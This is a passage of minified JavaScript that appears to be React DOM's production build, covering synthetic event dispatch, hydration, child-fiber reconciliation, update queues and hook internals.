e;if((f||h)&&(h=d.window===d?d:(h=d.ownerDocument)?h.defaultView||h.parentWindow:window,f?(_=n.relatedTarget||n.toElement,f=c,_=_?As(_):null,_!==null&&(m=Hs(_),_!==m||_.tag!==5&&_.tag!==6)&&(_=null)):(f=null,_=c),f!==_)){if(y=Wh,S="onMouseLeave",u="onMouseEnter",g="mouse",(t==="pointerout"||t==="pointerover")&&(y=Xh,S="onPointerLeave",u="onPointerEnter",g="pointer"),m=f==null?h:pr(f),x=_==null?h:pr(_),h=new y(S,g+"leave",f,n,d),h.target=m,h.relatedTarget=x,S=null,As(d)===c&&(y=new y(u,g+"enter",_,n,d),y.target=x,y.relatedTarget=m,S=y),m=S,f&&_)t:{for(y=f,u=_,g=0,x=y;x;x=js(x))g++;for(x=0,S=u;S;S=js(S))x++;for(;0<g-x;)y=js(y),g--;for(;0<x-g;)u=js(u),x--;for(;g--;){if(y===u||u!==null&&y===u.alternate)break t;y=js(y),u=js(u)}y=null}else y=null;f!==null&&sf(p,h,f,y,!1),_!==null&&m!==null&&sf(p,m,_,y,!0)}}e:{if(h=c?pr(c):window,f=h.nodeName&&h.nodeName.toLowerCase(),f==="select"||f==="input"&&h.type==="file")var T=ty;else if($h(h))if(Yg)T=ry;else{T=iy;var A=ny}else(f=h.nodeName)&&f.toLowerCase()==="input"&&(h.type==="checkbox"||h.type==="radio")&&(T=sy);if(T&&(T=T(t,c))){qg(p,T,n,d);break e}A&&A(t,h,c),t==="focusout"&&(A=h._wrapperState)&&A.controlled&&h.type==="number"&&Tu(h,"number",h.value)}switch(A=c?pr(c):window,t){case"focusin":($h(A)||A.contentEditable==="true")&&(ur=A,Fu=c,xa=null);break;case"focusout":xa=Fu=ur=null;break;case"mousedown":Bu=!0;break;case"contextmenu":case"mouseup":case"dragend":Bu=!1,ef(p,n,d);break;case"selectionchange":if(ly)break;case"keydown":case"keyup":ef(p,n,d)}var R;if(Tp)e:{switch(t){case"compositionstart":var N="onCompositionStart";break e;case"compositionend":N="onCompositionEnd";break e;case"compositionupdate":N="onCompositionUpdate";break e}N=void 0}else cr?jg(t,n)&&(N="onCompositionEnd"):t==="keydown"&&n.keyCode===229&&(N="onCompositionStart");N&&(Wg&&n.locale!=="ko"&&(cr||N!=="onCompositionStart"?N==="onCompositionEnd"&&cr&&(R=Gg()):(Yi=d,wp="value"in Yi?Yi.value:Yi.textContent,cr=!0)),A=yl(c,N),0<A.length&&(N=new jh(N,t,null,n,d),p.push({event:N,listeners:A}),R?N.data=R:(R=Xg(n),R!==null&&(N.data=R)))),(R=Kx?Zx(t,n):Jx(t,n))&&(c=yl(c,"onBeforeInput"),0<c.length&&(d=new jh("onBeforeInput","beforeinput",null,n,d),p.push({event:d,listeners:c}),d.data=R))}sv(p,e)})}function Na(t,e,n){return{instance:t,listener:e,currentTarget:n}}function yl(t,e){for(var n=e+"Capture",i=[];t!==null;){var s=t,r=s.stateNode;s.tag===5&&r!==null&&(s=r,r=Ta(t,n),r!=null&&i.unshift(Na(t,r,s)),r=Ta(t,e),r!=null&&i.push(Na(t,r,s))),t=t.return}return i}function js(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5);return t||null}function sf(t,e,n,i,s){for(var r=e._reactName,a=[];n!==null&&n!==i;){var o=n,l=o.alternate,c=o.stateNode;if(l!==null&&l===i)break;o.tag===5&&c!==null&&(o=c,s?(l=Ta(n,r),l!=null&&a.unshift(Na(n,l,o))):s||(l=Ta(n,r),l!=null&&a.push(Na(n,l,o)))),n=n.return}a.length!==0&&t.push({event:e,listeners:a})}var py=/\r\n?/g,hy=/\u0000|\uFFFD/g;function rf(t){return(typeof t=="string"?t:""+t).replace(py,`
`).replace(hy,"")}function yo(t,e,n){if(e=rf(e),rf(t)!==e&&n)throw Error(se(425))}function Sl(){}var zu=null,Vu=null;function Hu(t,e){return t==="textarea"||t==="noscript"||typeof e.children=="string"||typeof e.children=="number"||typeof e.dangerouslySetInnerHTML=="object"&&e.dangerouslySetInnerHTML!==null&&e.dangerouslySetInnerHTML.__html!=null}var Gu=typeof setTimeout=="function"?setTimeout:void 0,fy=typeof clearTimeout=="function"?clearTimeout:void 0,af=typeof Promise=="function"?Promise:void 0,my=typeof queueMicrotask=="function"?queueMicrotask:typeof af<"u"?function(t){return af.resolve(null).then(t).catch(gy)}:Gu;function gy(t){setTimeout(function(){throw t})}function Rc(t,e){var n=e,i=0;do{var s=n.nextSibling;if(t.removeChild(n),s&&s.nodeType===8)if(n=s.data,n==="/$"){if(i===0){t.removeChild(s),Ra(e);return}i--}else n!=="$"&&n!=="$?"&&n!=="$!"||i++;n=s}while(n);Ra(e)}function ts(t){for(;t!=null;t=t.nextSibling){var e=t.nodeType;if(e===1||e===3)break;if(e===8){if(e=t.data,e==="$"||e==="$!"||e==="$?")break;if(e==="/$")return null}}return t}function of(t){t=t.previousSibling;for(var e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="$"||n==="$!"||n==="$?"){if(e===0)return t;e--}else n==="/$"&&e++}t=t.previousSibling}return null}var Vr=Math.random().toString(36).slice(2),ei="__reactFiber$"+Vr,Da="__reactProps$"+Vr,Ci="__reactContainer$"+Vr,Wu="__reactEvents$"+Vr,vy="__reactListeners$"+Vr,_y="__reactHandles$"+Vr;function As(t){var e=t[ei];if(e)return e;for(var n=t.parentNode;n;){if(e=n[Ci]||n[ei]){if(n=e.alternate,e.child!==null||n!==null&&n.child!==null)for(t=of(t);t!==null;){if(n=t[ei])return n;t=of(t)}return e}t=n,n=t.parentNode}return null}function Qa(t){return t=t[ei]||t[Ci],!t||t.tag!==5&&t.tag!==6&&t.tag!==13&&t.tag!==3?null:t}function pr(t){if(t.tag===5||t.tag===6)return t.stateNode;throw Error(se(33))}function Yl(t){return t[Da]||null}var ju=[],hr=-1;function ds(t){return{current:t}}function ft(t){0>hr||(t.current=ju[hr],ju[hr]=null,hr--)}function dt(t,e){hr++,ju[hr]=t.current,t.current=e}var ls={},Jt=ds(ls),pn=ds(!1),Is=ls;function Cr(t,e){var n=t.type.contextTypes;if(!n)return ls;var i=t.stateNode;if(i&&i.__reactInternalMemoizedUnmaskedChildContext===e)return i.__reactInternalMemoizedMaskedChildContext;var s={},r;for(r in n)s[r]=e[r];return i&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=e,t.__reactInternalMemoizedMaskedChildContext=s),s}function hn(t){return t=t.childContextTypes,t!=null}function bl(){ft(pn),ft(Jt)}function lf(t,e,n){if(Jt.current!==ls)throw Error(se(168));dt(Jt,e),dt(pn,n)}function av(t,e,n){var i=t.stateNode;if(e=e.childContextTypes,typeof i.getChildContext!="function")return n;i=i.getChildContext();for(var s in i)if(!(s in e))throw Error(se(108,nx(t)||"Unknown",s));return xt({},n,i)}function wl(t){return t=(t=t.stateNode)&&t.__reactInternalMemoizedMergedChildContext||ls,Is=Jt.current,dt(Jt,t),dt(pn,pn.current),!0}function cf(t,e,n){var i=t.stateNode;if(!i)throw Error(se(169));n?(t=av(t,e,Is),i.__reactInternalMemoizedMergedChildContext=t,ft(pn),ft(Jt),dt(Jt,t)):ft(pn),dt(pn,n)}var _i=null,$l=!1,Pc=!1;function ov(t){_i===null?_i=[t]:_i.push(t)}function xy(t){$l=!0,ov(t)}function ps(){if(!Pc&&_i!==null){Pc=!0;var t=0,e=rt;try{var n=_i;for(rt=1;t<n.length;t++){var i=n[t];do i=i(!0);while(i!==null)}_i=null,$l=!1}catch(s){throw _i!==null&&(_i=_i.slice(t+1)),kg(xp,ps),s}finally{rt=e,Pc=!1}}return null}var fr=[],mr=0,Ml=null,El=0,Ln=[],kn=0,Us=null,yi=1,Si="";function bs(t,e){fr[mr++]=El,fr[mr++]=Ml,Ml=t,El=e}function lv(t,e,n){Ln[kn++]=yi,Ln[kn++]=Si,Ln[kn++]=Us,Us=t;var i=yi;t=Si;var s=32-Xn(i)-1;i&=~(1<<s),n+=1;var r=32-Xn(e)+s;if(30<r){var a=s-s%5;r=(i&(1<<a)-1).toString(32),i>>=a,s-=a,yi=1<<32-Xn(e)+s|n<<s|i,Si=r+t}else yi=1<<r|n<<s|i,Si=t}function Cp(t){t.return!==null&&(bs(t,1),lv(t,1,0))}function Rp(t){for(;t===Ml;)Ml=fr[--mr],fr[mr]=null,El=fr[--mr],fr[mr]=null;for(;t===Us;)Us=Ln[--kn],Ln[kn]=null,Si=Ln[--kn],Ln[kn]=null,yi=Ln[--kn],Ln[kn]=null}var wn=null,bn=null,mt=!1,Gn=null;function cv(t,e){var n=Nn(5,null,null,0);n.elementType="DELETED",n.stateNode=e,n.return=t,e=t.deletions,e===null?(t.deletions=[n],t.flags|=16):e.push(n)}function uf(t,e){switch(t.tag){case 5:var n=t.type;return e=e.nodeType!==1||n.toLowerCase()!==e.nodeName.toLowerCase()?null:e,e!==null?(t.stateNode=e,wn=t,bn=ts(e.firstChild),!0):!1;case 6:return e=t.pendingProps===""||e.nodeType!==3?null:e,e!==null?(t.stateNode=e,wn=t,bn=null,!0):!1;case 13:return e=e.nodeType!==8?null:e,e!==null?(n=Us!==null?{id:yi,overflow:Si}:null,t.memoizedState={dehydrated:e,treeContext:n,retryLane:1073741824},n=Nn(18,null,null,0),n.stateNode=e,n.return=t,t.child=n,wn=t,bn=null,!0):!1;default:return!1}}function Xu(t){return(t.mode&1)!==0&&(t.flags&128)===0}function qu(t){if(mt){var e=bn;if(e){var n=e;if(!uf(t,e)){if(Xu(t))throw Error(se(418));e=ts(n.nextSibling);var i=wn;e&&uf(t,e)?cv(i,n):(t.flags=t.flags&-4097|2,mt=!1,wn=t)}}else{if(Xu(t))throw Error(se(418));t.flags=t.flags&-4097|2,mt=!1,wn=t}}}function df(t){for(t=t.return;t!==null&&t.tag!==5&&t.tag!==3&&t.tag!==13;)t=t.return;wn=t}function So(t){if(t!==wn)return!1;if(!mt)return df(t),mt=!0,!1;var e;if((e=t.tag!==3)&&!(e=t.tag!==5)&&(e=t.type,e=e!=="head"&&e!=="body"&&!Hu(t.type,t.memoizedProps)),e&&(e=bn)){if(Xu(t))throw uv(),Error(se(418));for(;e;)cv(t,e),e=ts(e.nextSibling)}if(df(t),t.tag===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(se(317));e:{for(t=t.nextSibling,e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="/$"){if(e===0){bn=ts(t.nextSibling);break e}e--}else n!=="$"&&n!=="$!"&&n!=="$?"||e++}t=t.nextSibling}bn=null}}else bn=wn?ts(t.stateNode.nextSibling):null;return!0}function uv(){for(var t=bn;t;)t=ts(t.nextSibling)}function Rr(){bn=wn=null,mt=!1}function Pp(t){Gn===null?Gn=[t]:Gn.push(t)}var yy=Ni.ReactCurrentBatchConfig;function Jr(t,e,n){if(t=n.ref,t!==null&&typeof t!="function"&&typeof t!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(se(309));var i=n.stateNode}if(!i)throw Error(se(147,t));var s=i,r=""+t;return e!==null&&e.ref!==null&&typeof e.ref=="function"&&e.ref._stringRef===r?e.ref:(e=function(a){var o=s.refs;a===null?delete o[r]:o[r]=a},e._stringRef=r,e)}if(typeof t!="string")throw Error(se(284));if(!n._owner)throw Error(se(290,t))}return t}function bo(t,e){throw t=Object.prototype.toString.call(e),Error(se(31,t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t))}function pf(t){var e=t._init;return e(t._payload)}function dv(t){function e(u,g){if(t){var x=u.deletions;x===null?(u.deletions=[g],u.flags|=16):x.push(g)}}function n(u,g){if(!t)return null;for(;g!==null;)e(u,g),g=g.sibling;return null}function i(u,g){for(u=new Map;g!==null;)g.key!==null?u.set(g.key,g):u.set(g.index,g),g=g.sibling;return u}function s(u,g){return u=rs(u,g),u.index=0,u.sibling=null,u}function r(u,g,x){return u.index=x,t?(x=u.alternate,x!==null?(x=x.index,x<g?(u.flags|=2,g):x):(u.flags|=2,g)):(u.flags|=1048576,g)}function a(u){return t&&u.alternate===null&&(u.flags|=2),u}function o(u,g,x,S){return g===null||g.tag!==6?(g=Oc(x,u.mode,S),g.return=u,g):(g=s(g,x),g.return=u,g)}function l(u,g,x,S){var T=x.type;return T===lr?d(u,g,x.props.children,S,x.key):g!==null&&(g.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===Gi&&pf(T)===g.type)?(S=s(g,x.props),S.ref=Jr(u,g,x),S.return=u,S):(S=al(x.type,x.key,x.props,null,u.mode,S),S.ref=Jr(u,g,x),S.return=u,S)}function c(u,g,x,S){return g===null||g.tag!==4||g.stateNode.containerInfo!==x.containerInfo||g.stateNode.implementation!==x.implementation?(g=Fc(x,u.mode,S),g.return=u,g):(g=s(g,x.children||[]),g.return=u,g)}function d(u,g,x,S,T){return g===null||g.tag!==7?(g=Ds(x,u.mode,S,T),g.return=u,g):(g=s(g,x),g.return=u,g)}function p(u,g,x){if(typeof g=="string"&&g!==""||typeof g=="number")return g=Oc(""+g,u.mode,x),g.return=u,g;if(typeof g=="object"&&g!==null){switch(g.$$typeof){case uo:return x=al(g.type,g.key,g.props,null,u.mode,x),x.ref=Jr(u,null,g),x.return=u,x;case or:return g=Fc(g,u.mode,x),g.return=u,g;case Gi:var S=g._init;return p(u,S(g._payload),x)}if(ua(g)||qr(g))return g=Ds(g,u.mode,x,null),g.return=u,g;bo(u,g)}return null}function h(u,g,x,S){var T=g!==null?g.key:null;if(typeof x=="string"&&x!==""||typeof x=="number")return T!==null?null:o(u,g,""+x,S);if(typeof x=="object"&&x!==null){switch(x.$$typeof){case uo:return x.key===T?l(u,g,x,S):null;case or:return x.key===T?c(u,g,x,S):null;case Gi:return T=x._init,h(u,g,T(x._payload),S)}if(ua(x)||qr(x))return T!==null?null:d(u,g,x,S,null);bo(u,x)}return null}function f(u,g,x,S,T){if(typeof S=="string"&&S!==""||typeof S=="number")return u=u.get(x)||null,o(g,u,""+S,T);if(typeof S=="object"&&S!==null){switch(S.$$typeof){case uo:return u=u.get(S.key===null?x:S.key)||null,l(g,u,S,T);case or:return u=u.get(S.key===null?x:S.key)||null,c(g,u,S,T);case Gi:var A=S._init;return f(u,g,x,A(S._payload),T)}if(ua(S)||qr(S))return u=u.get(x)||null,d(g,u,S,T,null);bo(g,S)}return null}function _(u,g,x,S){for(var T=null,A=null,R=g,N=g=0,b=null;R!==null&&N<x.length;N++){R.index>N?(b=R,R=null):b=R.sibling;var w=h(u,R,x[N],S);if(w===null){R===null&&(R=b);break}t&&R&&w.alternate===null&&e(u,R),g=r(w,g,N),A===null?T=w:A.sibling=w,A=w,R=b}if(N===x.length)return n(u,R),mt&&bs(u,N),T;if(R===null){for(;N<x.length;N++)R=p(u,x[N],S),R!==null&&(g=r(R,g,N),A===null?T=R:A.sibling=R,A=R);return mt&&bs(u,N),T}for(R=i(u,R);N<x.length;N++)b=f(R,u,N,x[N],S),b!==null&&(t&&b.alternate!==null&&R.delete(b.key===null?N:b.key),g=r(b,g,N),A===null?T=b:A.sibling=b,A=b);return t&&R.forEach(function(P){return e(u,P)}),mt&&bs(u,N),T}function y(u,g,x,S){var T=qr(x);if(typeof T!="function")throw Error(se(150));if(x=T.call(x),x==null)throw Error(se(151));for(var A=T=null,R=g,N=g=0,b=null,w=x.next();R!==null&&!w.done;N++,w=x.next()){R.index>N?(b=R,R=null):b=R.sibling;var P=h(u,R,w.value,S);if(P===null){R===null&&(R=b);break}t&&R&&P.alternate===null&&e(u,R),g=r(P,g,N),A===null?T=P:A.sibling=P,A=P,R=b}if(w.done)return n(u,R),mt&&bs(u,N),T;if(R===null){for(;!w.done;N++,w=x.next())w=p(u,w.value,S),w!==null&&(g=r(w,g,N),A===null?T=w:A.sibling=w,A=w);return mt&&bs(u,N),T}for(R=i(u,R);!w.done;N++,w=x.next())w=f(R,u,N,w.value,S),w!==null&&(t&&w.alternate!==null&&R.delete(w.key===null?N:w.key),g=r(w,g,N),A===null?T=w:A.sibling=w,A=w);return t&&R.forEach(function(z){return e(u,z)}),mt&&bs(u,N),T}function m(u,g,x,S){if(typeof x=="object"&&x!==null&&x.type===lr&&x.key===null&&(x=x.props.children),typeof x=="object"&&x!==null){switch(x.$$typeof){case uo:e:{for(var T=x.key,A=g;A!==null;){if(A.key===T){if(T=x.type,T===lr){if(A.tag===7){n(u,A.sibling),g=s(A,x.props.children),g.return=u,u=g;break e}}else if(A.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===Gi&&pf(T)===A.type){n(u,A.sibling),g=s(A,x.props),g.ref=Jr(u,A,x),g.return=u,u=g;break e}n(u,A);break}else e(u,A);A=A.sibling}x.type===lr?(g=Ds(x.props.children,u.mode,S,x.key),g.return=u,u=g):(S=al(x.type,x.key,x.props,null,u.mode,S),S.ref=Jr(u,g,x),S.return=u,u=S)}return a(u);case or:e:{for(A=x.key;g!==null;){if(g.key===A)if(g.tag===4&&g.stateNode.containerInfo===x.containerInfo&&g.stateNode.implementation===x.implementation){n(u,g.sibling),g=s(g,x.children||[]),g.return=u,u=g;break e}else{n(u,g);break}else e(u,g);g=g.sibling}g=Fc(x,u.mode,S),g.return=u,u=g}return a(u);case Gi:return A=x._init,m(u,g,A(x._payload),S)}if(ua(x))return _(u,g,x,S);if(qr(x))return y(u,g,x,S);bo(u,x)}return typeof x=="string"&&x!==""||typeof x=="number"?(x=""+x,g!==null&&g.tag===6?(n(u,g.sibling),g=s(g,x),g.return=u,u=g):(n(u,g),g=Oc(x,u.mode,S),g.return=u,u=g),a(u)):n(u,g)}return m}var Pr=dv(!0),pv=dv(!1),Tl=ds(null),Al=null,gr=null,Lp=null;function kp(){Lp=gr=Al=null}function Np(t){var e=Tl.current;ft(Tl),t._currentValue=e}function Yu(t,e,n){for(;t!==null;){var i=t.alternate;if((t.childLanes&e)!==e?(t.childLanes|=e,i!==null&&(i.childLanes|=e)):i!==null&&(i.childLanes&e)!==e&&(i.childLanes|=e),t===n)break;t=t.return}}function wr(t,e){Al=t,Lp=gr=null,t=t.dependencies,t!==null&&t.firstContext!==null&&(t.lanes&e&&(dn=!0),t.firstContext=null)}function In(t){var e=t._currentValue;if(Lp!==t)if(t={context:t,memoizedValue:e,next:null},gr===null){if(Al===null)throw Error(se(308));gr=t,Al.dependencies={lanes:0,firstContext:t}}else gr=gr.next=t;return e}var Cs=null;function Dp(t){Cs===null?Cs=[t]:Cs.push(t)}function hv(t,e,n,i){var s=e.interleaved;return s===null?(n.next=n,Dp(e)):(n.next=s.next,s.next=n),e.interleaved=n,Ri(t,i)}function Ri(t,e){t.lanes|=e;var n=t.alternate;for(n!==null&&(n.lanes|=e),n=t,t=t.return;t!==null;)t.childLanes|=e,n=t.alternate,n!==null&&(n.childLanes|=e),n=t,t=t.return;return n.tag===3?n.stateNode:null}var Wi=!1;function Ip(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function fv(t,e){t=t.updateQueue,e.updateQueue===t&&(e.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,effects:t.effects})}function Mi(t,e){return{eventTime:t,lane:e,tag:0,payload:null,callback:null,next:null}}function ns(t,e,n){var i=t.updateQueue;if(i===null)return null;if(i=i.shared,$e&2){var s=i.pending;return s===null?e.next=e:(e.next=s.next,s.next=e),i.pending=e,Ri(t,n)}return s=i.interleaved,s===null?(e.next=e,Dp(i)):(e.next=s.next,s.next=e),i.interleaved=e,Ri(t,n)}function el(t,e,n){if(e=e.updateQueue,e!==null&&(e=e.shared,(n&4194240)!==0)){var i=e.lanes;i&=t.pendingLanes,n|=i,e.lanes=n,yp(t,n)}}function hf(t,e){var n=t.updateQueue,i=t.alternate;if(i!==null&&(i=i.updateQueue,n===i)){var s=null,r=null;if(n=n.firstBaseUpdate,n!==null){do{var a={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};r===null?s=r=a:r=r.next=a,n=n.next}while(n!==null);r===null?s=r=e:r=r.next=e}else s=r=e;n={baseState:i.baseState,firstBaseUpdate:s,lastBaseUpdate:r,shared:i.shared,effects:i.effects},t.updateQueue=n;return}t=n.lastBaseUpdate,t===null?n.firstBaseUpdate=e:t.next=e,n.lastBaseUpdate=e}function Cl(t,e,n,i){var s=t.updateQueue;Wi=!1;var r=s.firstBaseUpdate,a=s.lastBaseUpdate,o=s.shared.pending;if(o!==null){s.shared.pending=null;var l=o,c=l.next;l.next=null,a===null?r=c:a.next=c,a=l;var d=t.alternate;d!==null&&(d=d.updateQueue,o=d.lastBaseUpdate,o!==a&&(o===null?d.firstBaseUpdate=c:o.next=c,d.lastBaseUpdate=l))}if(r!==null){var p=s.baseState;a=0,d=c=l=null,o=r;do{var h=o.lane,f=o.eventTime;if((i&h)===h){d!==null&&(d=d.next={eventTime:f,lane:0,tag:o.tag,payload:o.payload,callback:o.callback,next:null});e:{var _=t,y=o;switch(h=e,f=n,y.tag){case 1:if(_=y.payload,typeof _=="function"){p=_.call(f,p,h);break e}p=_;break e;case 3:_.flags=_.flags&-65537|128;case 0:if(_=y.payload,h=typeof _=="function"?_.call(f,p,h):_,h==null)break e;p=xt({},p,h);break e;case 2:Wi=!0}}o.callback!==null&&o.lane!==0&&(t.flags|=64,h=s.effects,h===null?s.effects=[o]:h.push(o))}else f={eventTime:f,lane:h,tag:o.tag,payload:o.payload,callback:o.callback,next:null},d===null?(c=d=f,l=p):d=d.next=f,a|=h;if(o=o.next,o===null){if(o=s.shared.pending,o===null)break;h=o,o=h.next,h.next=null,s.lastBaseUpdate=h,s.shared.pending=null}}while(!0);if(d===null&&(l=p),s.baseState=l,s.firstBaseUpdate=c,s.lastBaseUpdate=d,e=s.shared.interleaved,e!==null){s=e;do a|=s.lane,s=s.next;while(s!==e)}else r===null&&(s.shared.lanes=0);Fs|=a,t.lanes=a,t.memoizedState=p}}function ff(t,e,n){if(t=e.effects,e.effects=null,t!==null)for(e=0;e<t.length;e++){var i=t[e],s=i.callback;if(s!==null){if(i.callback=null,i=n,typeof s!="function")throw Error(se(191,s));s.call(i)}}}var eo={},si=ds(eo),Ia=ds(eo),Ua=ds(eo);function Rs(t){if(t===eo)throw Error(se(174));return t}function Up(t,e){switch(dt(Ua,e),dt(Ia,t),dt(si,eo),t=e.nodeType,t){case 9:case 11:e=(e=e.documentElement)?e.namespaceURI:Cu(null,"");break;default:t=t===8?e.parentNode:e,e=t.namespaceURI||null,t=t.tagName,e=Cu(e,t)}ft(si),dt(si,e)}function Lr(){ft(si),ft(Ia),ft(Ua)}function mv(t){Rs(Ua.current);var e=Rs(si.current),n=Cu(e,t.type);e!==n&&(dt(Ia,t),dt(si,n))}function Op(t){Ia.current===t&&(ft(si),ft(Ia))}var gt=ds(0);function Rl(t){for(var e=t;e!==null;){if(e.tag===13){var n=e.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return e}else if(e.tag===19&&e.memoizedProps.revealOrder!==void 0){if(e.flags&128)return e}else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}return null}var Lc=[];function Fp(){for(var t=0;t<Lc.length;t++)Lc[t]._workInProgressVersionPrimary=null;Lc.length=0}var tl=Ni.ReactCurrentDispatcher,kc=Ni.ReactCurrentBatchConfig,Os=0,vt=null,Pt=null,Ut=null,Pl=!1,ya=!1,Oa=0,Sy=0;function jt(){throw Error(se(321))}function Bp(t,e){if(e===null)return!1;for(var n=0;n<e.length&&n<t.length;n++)if(!Yn(t[n],e[n]))return!1;return!0}function zp(t,e,n,i,s,r){if(Os=r,vt=e,e.memoizedState=null,e.updateQueue=null,e.lanes=0,tl.current=t===null||t.memoizedState===null?Ey:Ty,t=n(i,s),ya){r=0;do{if(ya=!1,Oa=0,25<=r)throw Error(se(301));r+=1,Ut=Pt=null,e.updateQueue=null,tl.current=Ay,t=n(i,s)}while(ya)}if(tl.current=Ll,e=Pt!==null&&Pt.next!==null,Os=0,Ut=Pt=vt=null,Pl=!1,e)throw Error(se(300));return t}function Vp(){var t=Oa!==0;return Oa=0,t}function Jn(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Ut===null?vt.memoizedState=Ut=t:Ut=Ut.next=t,Ut}function Un(){if(Pt===null){var t=vt.alternate;t=t!==null?t.memoizedState:null}else t=Pt.next;var e=Ut===null?vt.memoizedState:Ut.next;if(e!==null)Ut=e,Pt=t;else{if(t===null)throw Error(se(310));Pt=t,t={memoizedState:Pt.memoizedState,baseState:Pt.baseState,baseQueue:Pt.baseQueue,queue:Pt.queue,next:null},Ut===null?vt.memoizedState=Ut=t:Ut=Ut.next=t}return Ut}function Fa(t,e){return typeof e=="function"?e(t):e}function Nc(t){var e=Un(),n=e.queue;if(n===null)throw Error(se(311));n.lastRenderedReducer=t;var i=Pt,s=i.baseQueue,r=n.pending;if(r!==null){if(s!==null){var a=s.next;s.next=r.next,r.next=a}i.baseQueue=s=r,n.pending=null}if(s!==null){r=s.next,i=i.baseState;var o=a=null,l=null,c=r;do{var d=c.lane;if((Os&d)===d)l!==null&&(l=l.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),i=c.hasEagerState?c.eagerState:t(i,c.action);else{var p={lane:d,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};l===null?(o=l=p,a=i):l=l.next=p,vt.lanes|=d,Fs|=d}c=c.next}while(c!==null&&c!==r);l===null?a=i:l.next=o,Yn(i,e.memoizedState)||(dn=!0),e.memoizedState=i,e.baseState=a,e.baseQueue=l,n.lastRenderedState=i}if(t=n.interleaved,t!==null){s=t;do r=s.lane,vt.lanes|=r,Fs|=r,s=s.next;while(s!==t)}else s===null&&(n.lanes=0);return[e.memoizedState,n.dispatch]}function Dc(t){var e=Un(),n=e.queue;if(n===null)throw Error(se(311));n.lastRenderedReducer=t;var i=n.dispatch,s=n.pending,r=e.memoizedState;if(s!==null){n.pending=null;var a=s=s.next;do r=t(r,a.action),a=a.next;while(a!==s);Yn(r,e.memoizedState)||(dn=!0),e.memoizedState=r,e.baseQueue===null&&(e.baseState=r),n.lastRenderedState=r}return[r,i]}function gv(){}function vv(t,e){var n=vt,i=Un(),s=e(),r=!Yn(i.memoizedState,s);if(r&&(i.memoizedState=s,dn=!0),i=i.queue,Hp(yv.bind(null,n,i,t),[t]),i.getSnapshot!==e||r||Ut!==null&&Ut.memoizedState.tag&1){if(n.flags|=2048,Ba(9,xv.bind(null,n,i,s,e),void 0,null),Ft===null)throw Error(se(349));Os&30||_v(n,e,s)}return s}function _v(t,e,n){t.flags|=16384,t={getSnapshot:e,value:n},e=vt.updateQueue,e===null?(e={lastEffect:null,stores:null},vt.updateQueue=e,e.stores=[t]):(n=e.stores,n===null?e.stores=[t]:n.push(t))}function xv(t,e,n,i){e.value=n,e.getSnapshot=i,Sv(e)&&bv(t)}function yv(t,e,n){return n(function(){Sv(e)&&bv(t)})}function Sv(t){var e=t.getSnapshot;t=t.value;try{var n=e();return!Yn(t,n)}catch{return!0}}function bv(t){var e=Ri(t,1);e!==null&&qn(e,t,1,-1)}function mf(t){var e=Jn();return typeof t=="function"&&(t=t()),e.memoizedState=e.baseState=t,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Fa,lastRenderedState:t},e.queue=t,t=t.dispatch=My.bind(null,vt,t),[e.memoizedState,t]}function Ba(t,e,n,i){return t={tag:t,create:e,destroy:n,deps:i,next:null},e=vt.updateQueue,e===null?(e={lastEffect:null,stores:null},vt.updateQueue=e,e.lastEffect=t.next=t):(n=e.lastEffect,n===null?e.lastEffect=t.next=t:(i=n.next,n.next=t,t.next=i,e.lastEffect=t)),t}function wv(){return Un().memoizedState}function nl(t,e,n,i){var s=Jn();vt.flags|=t,s.memoizedState=Ba(1|e,n,void 0,i===void 0?null:i)}function Kl(t,e,n,i){var s=Un();i=i===void 0?null:i;var r=void 0;if(Pt!==null){var a=Pt.memoizedState;if(r=a.destroy,i!==null&&Bp(i,a.deps)){s.memoizedState=Ba(e,n,r,i);return}}vt.flags|=t,s.memoizedState=Ba(1|e,n,r,i)}function gf(t,e){return nl(8390656,8,t,e)}function Hp(t,e){return Kl(2048,8,t,e)}function Mv(t,e){return Kl(4,2,t,e)}function Ev(t,e){return Kl(4,4,t,e)}function Tv(t,e){if(typeof e=="function")return t=t(),e(t),function(){e(null)};if(e!=null)return t=t(),e.current=t,function(){e.current=null}}function Av(t,e,n){return n=n!=null?n.concat([t]):null,Kl(4,4,Tv.bind(null,e,t),n)}function Gp(){}function Cv(t,e){var n=Un();e=e===void 0?null:e;var i=n.memoizedState;return i!==null&&e!==null&&Bp(e,i[1])?i[0]:(n.memoizedState=[t,e],t)}function Rv(t,e){var n=Un();e=e===void 0?null:e;var i=n.memoizedState;return i!==null&&e!==null&&Bp(e,i[1])?i[0]:(t=t(),n.memoizedState=[t,e],t)}function Pv(t,e,n){return Os&21?(Yn(n,e)||(n=Ig(),vt.lanes|=n,Fs|=n,t.baseState=!0),e):(t.baseState&&(t.baseState=!1,dn=!0),t.memoizedState=n)}function by(t,e){var n=rt;rt=n!==0&&4>n?n:4,t(!0);var i=kc.transition;kc.transition={};try{t(!1),e()}finally{rt=n,kc.transition=i}}function Lv(){return Un().memoizedState}function wy(t,e,n){var i=ss(t);if(n={lane:i,action:n,hasEagerState:!1,eagerState:null,next:null},kv(t))Nv(e,n);else if(n=hv(t,e,n,i),n!==null){var s=nn();qn(n,t,i,s),Dv(n,e,i)}}function My(t,e,n){var 